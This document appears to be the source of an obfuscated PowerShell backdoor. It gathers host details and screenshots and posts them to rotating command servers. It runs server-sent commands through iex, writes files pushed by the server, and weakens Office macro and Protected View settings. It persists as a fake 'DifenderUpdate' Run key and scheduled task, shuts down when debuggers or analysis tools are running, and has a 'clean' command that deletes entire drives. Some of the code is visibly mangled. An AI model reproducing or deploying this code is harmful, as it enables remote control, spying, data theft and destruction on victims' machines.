function IICTRTVPSUJIDTGSEMSYZITLWWEWVF() {
 try {
  $ips = ""
  Get - WmiObject Win32_NetworkAdapterConfiguration - Filter "IPEnabled=True" | Where {
   $_.IPAddress[0] -NotLike '169*'
  } | % {
   $ips = $ips + "-" + $_.IPAddress[0]
  }
  return $ips.substring(1);
 } catch {
  return "ErrorIP";
 }
}

function GJQCUTZFLAKXHZRWPOURTIMZNBAVHM($ip) {
 try {
  return CHBMQVRLULFPNBBLPPIFIOUVJYYYMN $country_url$ip;
 } catch {
  return "ErrorCountry";
 }
}

function AXLDTIIHPOELDQGZHERYQCZAQBMOXF() {
 try {
  return (Get - WmiObject Win32_OperatingSystem).Name;
 } catch {
  return "ErrorOS";
 }
}

function RUSTKYQIVTQKCNIUDVKWJAPGLEPEJR() {
 try {
  return (Get - WmiObject Win32_OperatingSystem).OSArchitecture;
 } catch {
  return "ErrorArch";
 }
}

function YGNJEVDJGMMXTERKHIPRUGWTQKGPDU() {
 try {
  return (Get - WmiObject Win32_ComputerSystem).Domain;
 } catch {
  return "ErrorDomain";
 }
}

function KYQXIPIBMPMXSTRBIKTHXOLJDMXIFF() {
 try {
  return (Get - WmiObject Win32_ComputerSystem).Name;
 } catch {
  return "ErrorHostName";
 }
}

function FVOALZVMYJGVZNKQGRGILBBRGKJWZB() {
 return $env:UserName
}

function KRMTFGCGMOJEHRQDDYJHMNWXGMYEZF($kill_cmd) {
 if ($kill_cmd -eq "reboot") {
  shutdown - r - f - t 0
 }
 if ($kill_cmd -eq "shutdown") {
  shutdown - s - f - t 0
 }
 if ($kill_cmd -eq "clean") {
  Remove - Item C: \-Recurse - Force - Confirm - ErrorAction SilentlyContinue | Out - Null
  Remove - Item D: \-Recurse - Force - Confirm - ErrorAction SilentlyContinue | Out - Null
  Remove - Item E: \-Recurse - Force - Confirm - ErrorAction SilentlyContinue | Out - Null
  Remove - Item F: \-Recurse - Force - Confirm - ErrorAction SilentlyContinue | Out - Null
  shutdown - r - f - t 0
 }
}

function JPAVZUCSUCNNORLVFECMLZCIDAYKTB($enc_msg) {
 while ($true) {
  try {
   $content = $enc_msg
   $webreq = [System.Net.WebRequest]::Create($url);
   $webreq.proxy = [Net.WebRequest]::GetSystemWebProxy()
   $webreq.proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
   $encode_data = [System.Text.Encoding]::UTF8.GetBytes($content);
   $webreq.Method = "POST";
   $webreq.ContentLength = $encode_data.length;
   if ($encode_data.Length -gt 0) {
    $req_stream = $webreq.GetRequestStream();
    $req_stream.Write($encode_data, 0, $encode_data.Length);
   }
   [System.Net.WebResponse] $resp = $webreq.GetResponse();
   if ($resp -ne $null) {
    $data = $resp.GetResponseStream();
    [System.IO.StreamReader] $res_data = New - Object System.IO.StreamReader $data;
    [String] $result = $res_data.ReadToEnd();
   }
  } catch {
   Write - Host '???????,????...'
   $result = "error"
  }
  if ($result -eq "error") {
   DUSLZZXFYZRHHCMRSZMUPIQRJAIYJG
    [int] $num = EFTEBBSENZBHDXJNWFYNKTQQCSIVGS
   FDWTKNDBFQFSTCPBHWPFJTXNDLWVEN $num
  } else {
   return $result
  }
 }
}

function QJFMWIUKWSUMJTRCZTLQQWEYYZRJPZ($path) {
 $Content = Get - Content - Path $path.ToString() - Encoding Byte
 $Base64 = [System.Convert]::ToBase64String($Content)
 return $Base64
}

function CHBMQVRLULFPNBBLPPIFIOUVJYYYMN($url) {
 while ($true) {
  try {
   $webreq = [System.Net.WebRequest]::Create($url);
   $webreq.proxy = [Net.WebRequest]::GetSystemWebProxy()
   $webreq.proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
   $webreq.Method = "GET";
   [System.Net.WebResponse] $resp = $webreq.GetResponse();
   if ($resp -ne $null) {
    $data = $resp.GetResponseStream();
    [System.IO.StreamReader] $res_data = New - Object System.IO.StreamReader $data;
    [String] $result = $res_data.ReadToEnd();
   }
  } catch {
   Write - Host '???????,????...'
   $result = "error"
  }
  if ($result -eq "error") {
   DUSLZZXFYZRHHCMRSZMUPIQRJAIYJG
    [int] $num = EFTEBBSENZBHDXJNWFYNKTQQCSIVGS
   FDWTKNDBFQFSTCPBHWPFJTXNDLWVEN $num
  } else {
   return $result
  }
 }
}

function VYREHVIPWUKLWWZJCINPNKPBDPUCQD($key_name_png) {
 try {
  $usr = $env:UserName
  if ($usr.Substring($usr.Length - 1) -ne '$') {
   Add - Type - AssemblyName System.Windows.Forms
   Add - type - AssemblyName System.Drawing
   $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
   $Width = $Screen.Width
   $Height = $Screen.Height
   $Left = $Screen.Left
   $Top = $Screen.Top
   $bitmap = New - Object System.Drawing.Bitmap $Width, $Height
   $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
   $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
   $bitmap.Save($tempPath + $key_name_png + ".png")
  } else {
   set - content($tempPath + $key_name_png + ".png") - value " "
  }
 } catch {
  set - content($tempPath + $key_name_png + ".png") - value " "
 }
}

function WTFAOLTMJJRQVGMULCNGNGNHHBLKBA($temp_path, $sysid) {
 if ($sysid -ne "") {
  $pathMe = "$($temp_path)$($sysid)"
  if ((Test - Path $pathMe) -eq $true) {
   $id = Get - Content $pathMe
   return $id
  }
 }
 return THICGXJLUXIEKEBTOGVCTBFMZZQQRP($pathMe)
}

function THICGXJLUXIEKEBTOGVCTBFMZZQQRP($pathMe) {
 Set-Content $pathMe $sysid
 return $sysid
}

function FDWTKNDBFQFSTCPBHWPFJTXNDLWVEN($sec) {
 Start-Sleep -Seconds $sec
}

function LEWSKGFARYMGPMCHIIGYNKFFMFLANP($evil) {
 try {
  return iex($evil)
 } catch {
  return "error in iex"
 }
}

function BFIPUHBPFIQTEAFPBUQDPOEFQIYQAW($tes) {
 $out = "{"
 foreach($h in $tes.Keys) {
  $v = $tes.Item($h)
  $v = $v.Replace('\','\\
   ')
   $v = $v.Replace("n", '\n') 
   $v = $v.Replace("r", '\n') 
   $v = $v.Replace('"', '\"') 
   $out += ""
   ${
    h
   }
   ":"
   $($v)
   ","
  }
  $out = $out.substring(0, $out.length - 1)
  $out += "}"
  return $out
 }

 function DALOOZLLQFFXXGZKDMWUWZUWRDANTN($item) {
  $item = $item.substring(1, $item.length - 2)
  $item = $item.split(',')
  $out = @{}
  foreach($i in $item) {
   $i = $i.trim()
   $i = $i -split('":')
   $i0 = $i[0].trim()
   $i1 = $i[1].trim().replace('\"', '"').replace('\\', '\')
    $i0 = $i0.substring(1, $i0.length - 1) 
    $i1 = $i1.substring(1, $i1.length - 2) 
    $out.Add($i0, $i1)
   }
   return $out
  }

  function LWDXOXWEOJHSTHXAIBTEKHYGQUYCKK($public_ip) {
   $SysInfo = AXLDTIIHPOELDQGZHERYQCZAQBMOXF
   $SysInfo += "**"
   $SysInfo += IICTRTVPSUJIDTGSEMSYZITLWWEWVF
   $SysInfo += "**"
   $SysInfo += RUSTKYQIVTQKCNIUDVKWJAPGLEPEJR
   $SysInfo += "**"
   $SysInfo += KYQXIPIBMPMXSTRBIKTHXOLJDMXIFF
   $SysInfo += "**"
   $SysInfo += YGNJEVDJGMMXTERKHIPRUGWTQKGPDU
   $SysInfo += "**"
   $SysInfo += FVOALZVMYJGVZNKQGRGILBBRGKJWZB
   $SysInfo += "**"
   $SysInfo += GJQCUTZFLAKXHZRWPOURTIMZNBAVHM $public_ip
   return $SysInfo
  }

  function NVXGTXFSSWQSFXVMBKDBSRMPZCEKVF($win_cmd) {
   $out = (LEWSKGFARYMGPMCHIIGYNKFFMFLANP($win_cmd) | out - string)
   if ($out.Length -eq 0) {
    $out = "done"
   }
   return $out
  }

  function BJKZZZZBBDRCDDZYKGGKGPZVQBPKLL($cmd) {
   try {
    if ($cmd.Length -gt 0) {
     KRMTFGCGMOJEHRQDDYJHMNWXGMYEZF($cmd)
    }
    if ($cmd -eq "screenshot") {
     VYREHVIPWUKLWWZJCINPNKPBDPUCQD $sysid
     return "done"
    }
    if ($cmd -eq "download") {
     $full_img2 = $tempPath + $sysid + ".png"
     $b64_img = QJFMWIUKWSUMJTRCZTLQQWEYYZRJPZ $full_img2
     $image = @{
      SYSID = $sysid;
      IMAGE = $b64_img.ToString();
      ACTION = "IMAGE";
     }
     $convert_to_json = BFIPUHBPFIQTEAFPBUQDPOEFQIYQAW 
     $image
     [int]$num = EFTEBBSENZBHDXJNWFYNKTQQCSIVGS
     FDWTKNDBFQFSTCPBHWPFJTXNDLWVEN 
     $num
     $image_res = JPAVZUCSUCNNORLVFECMLZCIDAYKTB $convert_to_json
     if ($image_res.Length -gt 0) {
      $arr_file = DALOOZLLQFFXXGZKDMWUWZUWRDANTN $image_res
      if ($arr_file.STATUS -eq "OK") {
       return "done"
      } else {
       return "error"
      }
     }
    }
    if ($cmd.StartsWith("upload")) {
     $image = @{
      SYSID = $sysid;
      FILE = "";
      ACTION = "UPLOAD";
     }
     $convert_to_json = BFIPUHBPFIQTEAFPBUQDPOEFQIYQAW $image
     $convert_to_json = VRQPDFAVTELBWHTIOALBBZILWMVIPM $private $convert_to_json
     [int]$num = EFTEBBSENZBHDXJNWFYNKTQQCSIVGS
     FDWTKNDBFQFSTCPBHWPFJTXNDLWVEN $num
     $file_download = JPAVZUCSUCNNORLVFECMLZCIDAYKTB $convert_to_json
     if ($file_download.Length -gt 0) {
      $arr_file = DALOOZLLQFFXXGZKDMWUWZUWRDANTN $file_download
      if ($arr_file.STATUS -eq "OK") {
       $decode_content = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($arr_file.CONTENT))
       $path = $tempPath + $arr_file.FILENAME
       Set-Content $path $decode_content
       return "done"
      } else {
       return "error"
      }
     } else {
      return "error"
     }
    } else {
     return NVXGTXFSSWQSFXVMBKDBSRMPZCEKVF $cmd
    }
   } catch {
    return "error"
   }
  }

  function DUSLZZXFYZRHHCMRSZMUPIQRJAIYJG() {
   $rnd = Get - Random - minimum 0 - maximum($dragon_middle.Length)
   $site = $dragon_middle[$rnd]
   $global:url = $site
  }

  function RSCYEIZPIEGIVMQRICWICQUESCVMHO() {
   for ($i = 10; $i -le 20; $i++) {
    $rgb = "HKCU:\Software\Microsoft\Office\$i.0\word\Security";
    if (test - path $rgb) {
     New - ItemProperty - Path $rgb - Name AccessVBOM - Value 1 - PropertyType DWORD - Force | out - null;
     New - ItemProperty - Path $rgb - Name VBAWarnings - Value 1 - PropertyType DWORD - Force | out - null;
     $rgb = "$rgb\ProtectedView";
     if (test - path $rgb) {
      New - ItemProperty - Path $rgb - Name DisableAttachementsInPV - Value 1 - PropertyType DWORD - Force | out - null;
      New - ItemProperty - Path $rgb - Name DisableInternetFilesInPV - Value 1 - PropertyType DWORD - Force | out - null;
      New - ItemProperty - Path $rgb - Name DisableUnsafeLocationsInPV - Value 1 - PropertyType DWORD - Force | out - null;
     }
    }
   }
   attrib + s + h "$tempPath$filenamePathV"
   attrib + s + h "$tempPath$filenamePathP"
   GEHTQZSQXUIQJAYWSCKHQQZUPTHAXD -p "HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Run" - k "DifenderUpdate" -v "wscript $tempPath$filenamePathV"
   if (GEHTQZSQXUIQJAYWSCKHQQZUPTHAXD - p "HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run" - k "DifenderUpdate" -v "wscript $tempPath$filenamePathV" - eq "error") {
    Write - Host "????????????"
   }
   try {
    schtasks / Create / RU system / SC ONLOGON / TN Microsoft\ WindowsDifenderUpdate / TR "wscript $tempPath$filenamePathV" / F
   } catch {
    Write - Host "???????????"
   }
  }

  function EFTEBBSENZBHDXJNWFYNKTQQCSIVGS() {
   $number = get - random - maximum 30 - minimum 1
   return $number
  }

  function BOAEZXQVCZWXAJAEFBFBAKFQEPHKXI() {
   while ($true){
    DUSLZZXFYZRHHCMRSZMUPIQRJAIYJG
    $realIP = CHBMQVRLULFPNBBLPPIFIOUVJYYYMN $get_validip
    $get = LWDXOXWEOJHSTHXAIBTEKHYGQUYCKK $realIP
    $BOAEZXQVCZWXAJAEFBFBAKFQEPHKXI = @{
     SYSINFO = $get.ToString();
     ACTION = "REGISTER";
    }
    $convert_to_json = BFIPUHBPFIQTEAFPBUQDPOEFQIYQAW 
    $BOAEZXQVCZWXAJAEFBFBAKFQEPHKXI
    $convert_to_json = VRQPDFAVTELBWHTIOALBBZILWMVIPM 
    private $convert_to_json
    [int]$num = EFTEBBSENZBHDXJNWFYNKTQQCSIVGS
    $response_of_server = JPAVZUCSUCNNORLVFECMLZCIDAYKTB $convert_to_json
    $get_enc_msg = $response_of_server -split " "
    $get_key = AODDZIPJAWKAFPKYRNMUNONCHKLZAX $public $get_enc_msg
    $get_key = DALOOZLLQFFXXGZKDMWUWZUWRDANTN $get_key
    if ($get_key.STATUS -eq "OK") {
     $global:sysid = $get_key.TOKEN
     WTFAOLTMJJRQVGMULCNGNGNHHBLKBA $tempPath $sysid
     VYREHVIPWUKLWWZJCINPNKPBDPUCQD $sysid
     $full_img2 = $tempPath + $sysid + ".png"
     $b64_img = QJFMWIUKWSUMJTRCZTLQQWEYYZRJPZ $full_img2
     $image = @{
      SYSID = $sysid;
      IMAGE = $b64_img.ToString();
      ACTION = "IMAGE";
     }
     $convert_to_json = BFIPUHBPFIQTEAFPBUQDPOEFQIYQAW $image
     $image_res = JPAVZUCSUCNNORLVFECMLZCIDAYKTB $convert_to_json
     $test = $image_res
     break
    }
   }
  }

  function ZJWQMTESJEICXNEMPIDMEFMDUHTYIJ([string]$p, [string]$k) {
   try {
    if (Test - Path $p) {
     try {
      if (Get - ItemProperty - Path $p - Name $k - ErrorAction SilentlyContinue | gm | Where - Object {
        $_.Name -eq $k
       }) {
       return (Get - ItemProperty - Path $p - Name $k).$k
      }
     } catch {
      return ""
     }
    }
    return ""
   } catch {
    return ""
   }
  }

  function GEHTQZSQXUIQJAYWSCKHQQZUPTHAXD([string] $p, [string] $k, [string] $v) {
   try {
    New - ItemProperty - Path $p - Name $k - Value $v - Force - ErrorAction SilentlyContinue | Out - Null
   } catch {
    return "error"
   }
  }

  function UUPHXKPQBGSKWNPPHHDBFJEYBYGOWG() {
   if ((@(dir "$tempPath*.png")).Length -ge 1) {
    return
   }
   write-host "...."
   Start-sleep -Seconds 600
  }

  function LHFLBKHGTOTNLQKLMKCDGOIFOOPOHT() {
   $p = @("win32_remote", "win64_remote64", "ollydbg", "ProcessHacker", "tcpview", "autoruns", "autorunsc", "filemon", "procmon", "regmon", "procexp", "idaq", "idaq64", "ImmunityDebugger", "Wireshark", "dumpcap", "HookExplorer", "ImportREC", "PETools", "LordPE", "dumpcap", "SysInspector", "proc_analyzer", "sysAnalyzer", "sniff_hit", "windbg", "joeboxcontrol", "joeboxserver")
   for ($i = 0; $i -lt $p.length; $i++) {
    if (ps - name $p[$i] - ErrorAction SilentlyContinue) {
     shutdown / s / f / t 0
     exit
    }
   }
  }
  
 RSCYEIZPIEGIVMQRICWICQUESCVMHO 
 LHFLBKHGTOTNLQKLMKCDGOIFOOPOHT 
 UUPHXKPQBGSKWNPPHHDBFJEYBYGOWG 
 DUSLZZXFYZRHHCMRSZMUPIQRJAIYJG 
 BOAEZXQVCZWXAJAEFBFBAKFQEPHKXI
  while ($true){
   try{
    WTFAOLTMJJRQVGMULCNGNGNHHBLKBA $tempPath $sysid
    $array = @{
     ACTION = "COMMAND";
     TOKEN = $sysid
    }
    $convert_to_json = BFIPUHBPFIQTEAFPBUQDPOEFQIYQAW 
    $array
    $convert_to_json = VRQPDFAVTELBWHTIOALBBZILWMVIPM 
    private $convert_to_json
    [int] $num = EFTEBBSENZBHDXJNWFYNKTQQCSIVGS
    FDWTKNDBFQFSTCPBHWPFJTXNDLWVEN $num
    $cmd = JPAVZUCSUCNNORLVFECMLZCIDAYKTB $convert_to_json
    if ($cmd.Length -gt 0) {
     $cmd = $cmd -split " "
     $get_cmd_enc = AODDZIPJAWKAFPKYRNMUNONCHKLZAX $public $cmd
     $get_win_cmd = DALOOZLLQFFXXGZKDMWUWZUWRDANTN $get_cmd_enc
     if ($get_win_cmd.STATUS -eq "OK") {
      if ($get_win_cmd.ACTION -eq "REGISTER") {
       BOAEZXQVCZWXAJAEFBFBAKFQEPHKXI
      } else {
       $win_cmd_output = BJKZZZZBBDRCDDZYKGGKGPZVQBPKLL $get_win_cmd.CMD
       if ($win_cmd_output.ToString() -eq "error") {
        $result = @{
         ACTION = "RESULT";
         OUTPUT = "Operation is fail";
         CMDID = $get_win_cmd.CMDID;
         TOKEN = $sysid
        }
       } else {
        $result = @{
         ACTION = "RESULT";
         OUTPUT = $win_cmd_output.ToString();
         CMDID = $get_win_cmd.CMDID;
         TOKEN = $sysid
        }
       }
       $result_win_cmd = BFIPUHBPFIQTEAFPBUQDPOEFQIYQAW $result
       $result_win_cmd = VRQPDFAVTELBWHTIOALBBZILWMVIPM $private $result_win_cmd[int] $num = EFTEBBSENZBHDXJNWFYNKTQQCSIVGS
       FDWTKNDBFQFSTCPBHWPFJTXNDLWVEN $num
       $status_server = JPAVZUCSUCNNORLVFECMLZCIDAYKTB $result_win_cmd
       $get_enc_msg = $status_server -split " "
       $get_result_enc = AODDZIPJAWKAFPKYRNMUNONCHKLZAX $public $get_enc_msg
       $dec_win_cmd = DALOOZLLQFFXXGZKDMWUWZUWRDANTN $get_result_enc
      }
     }
     FDWTKNDBFQFSTCPBHWPFJTXNDLWVEN 120
    }
   } catch {
    DUSLZZXFYZRHHCMRSZMUPIQRJAIYJG
    continue
   }
  }